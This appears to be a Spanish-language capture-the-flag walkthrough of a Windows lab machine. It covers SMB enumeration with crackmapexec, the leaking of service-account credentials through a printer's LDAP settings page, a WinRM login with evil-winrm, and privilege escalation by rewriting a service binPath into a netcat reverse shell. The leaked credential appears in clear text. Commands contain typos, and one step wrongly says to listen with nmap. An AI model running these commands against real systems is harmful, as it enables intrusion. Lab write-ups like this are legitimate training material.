Maquina windows

	[·] Empezariamos con el escaneo normal con nmap
	[·] Ahora a ver muchos puertos abietos y haber lanzado el reconcimiento exaustivo sobre esos puertos abiertos, no seria igual que en linux que te lanzarias de inmediato al ver su paguina, aqui vemos que esta un puerto abierto en que podemos identificar como el servicio smb con el puerto 445,  con la herramienta crackmapexcec podemos lanzar un reconocimiento a ese servivio en primer lugar
		sudo crackmapexec smb 10.10.11.108
	[·]De este recocnocimiento podemos sacr pocas cosas en este caso pero siempre vinene bien echarle un ojo, solo podemos ver el nombre de la maquina, dominio y que el SMB esta firmado
	[·]Habiendo acabado con esa prueba ahora si nos podemos lanzar con los puertos que tengan que ver con http, que son varios en esta maquina
	[·]En su pagina principal vemos, que es una pagina de una impresora
	viendola un poco llegamos al apartado de settings y ahi vemos que hcae una peticion a un servidor local por el puerto 389, en elservidor local podemos cambiar la direccion IP a por ejemplo la nuestra quiza, y vemos que nos da una contraseña y un usario
	[·]Obteniedno una credencial, con crackmapexcec podemos comprobarlas con la herramienta con el siguiente comando:
		crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
	y vwemos que nos da un estado exitoso
	[·]ahora lo comun que se hace en este punto es listar los recursos compartidos con smbmap o smbclinet, como en el escaneo vimos el puerto 5985 que eso es el winrm que corresponde al servicio de administracioin remota de windows, primiero lo probaremos denuebo con crackmapexcec (Recordando que para que eso sea posible eo usurio deberia estar dentro del grupo de remote management users) pero como no lo sabemos no perdemos nada con intentar
		rackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
	[·]Y el saber que estas credenciales son correctas lo que nos queda hacer ahora solo seria estar en el sistema, esto se logra con una erramienta evil-winrm
		evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
	[·]Ahora tenemos una consola de windows interactiva, y en este punto tenemos la flag del primer usario y aunque parezca que podemos ver la flag de root es solo un bait no caigan, aun nos queda convertirnos en administradores de la maquina
	[·]Para esto vamos a modificar el path de un servicio para poder enviarnos una reverse shell en la que seamos adminiistradores, esto lo logramos buscando entre los distintos servicios que corren en el servidor en cual tenemos servicios de modificacion y ejecutandole el siguinte comando
		sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd <IP> 443"
	y parando e inicaindo nuevamente el servicio a la vez que nos ponemos en escucha con nmap
	esto seria todo ahi deberiamos poder ver la flag de root